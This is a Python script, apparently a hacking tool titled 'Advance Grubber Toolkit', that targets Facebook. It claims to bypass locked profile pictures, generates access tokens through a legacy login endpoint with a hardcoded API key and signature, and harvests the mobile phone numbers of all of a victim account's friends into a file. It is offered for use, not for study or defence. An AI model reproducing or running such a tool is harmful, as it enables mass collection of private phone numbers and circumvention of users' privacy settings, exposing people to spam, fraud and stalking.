import os
import requests
import json
import time
import wget
import os
import getpass

print('''
        ------------------------------------------
       |       Advance Grubber Toolkit v1.0       |
       |  Script Developed By M4d Sn!p3r(Mr.SxS)  |
       |      Usage: python3 kill3r.py            |
        ------------------------------------------
 1. Bypass Locked profile Picture 2. Generate Token 3. Grub Mobile Numbers
 
''')
while 10 == 10:
    User_input = input("What Do you want?: ").strip()

    if User_input == "1":
        ID = str(input("Enter The ID: ")).strip()
        API = "https://graph.facebook.com/v2.0/"
        API2 ="/picture?width=1080&height=1080"
        API3 = API + ID + API2
        Down_Pic = wget.download(API3)
        file_format = str(".jpg")
        rename = ID + file_format
        os.rename('picture', rename)
        time.sleep( 3 )
        print(" [+]Please wait...")
        print(" [+]Done...")
    elif User_input == "2":
        ID = str(input("Enter The Email/Phone: ")).strip()
        Password = getpass.getpass(prompt="Enter Your Password: ").strip()
        filename = str(input("Token Name: ")).strip()
        filename2 = str(".log")
        filename3 = filename + filename2
        API1 = "https://api.facebook.com/restserver.php?api_key=882a8490361da98702bf97a021ddc14d&email="
        API2 = "&format=JSON&generate_session_cookies=1&locale=en_US&method=auth.login&password="
        API3 = "&return_ssl_resources=1&v=1.0&sig=d7f709ca0e33fa6af8260bbb80f96275"
        Payload = API1 + ID + API2 + Password + API3
        json_data = requests.get(Payload).json()
        json_token = json_data["access_token"]
        file1 = open('Token/' + filename3,"w")
        file1.write(json_token)
        print("[+] Token has been Created")
        file1.close()


    elif User_input == "3":
        Token = input("Enter Token Name: ").strip()
        Token2 = str(".log")
        Token3 = Token + Token2
        token4 = open('Token/' + Token3,"r").read()
        r = requests.get('https://graph.facebook.com/me/friends?access_token='+token4)
        a = json.loads(r.text)
        out = open('output/' + 'phone.txt','w')
        for i in a['data']:
            x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+token4)
            z = json.loads(x.text)
            try:
                out.write(z['mobile_phone'] + '\n')
                print (z["name"])
                print (z["mobile_phone"])
            except KeyError:
                pass
        print("[+] All Phone Number Saved")
        print("[+] Check output Folder")           
else:
    print("[+] Worng Input")

    
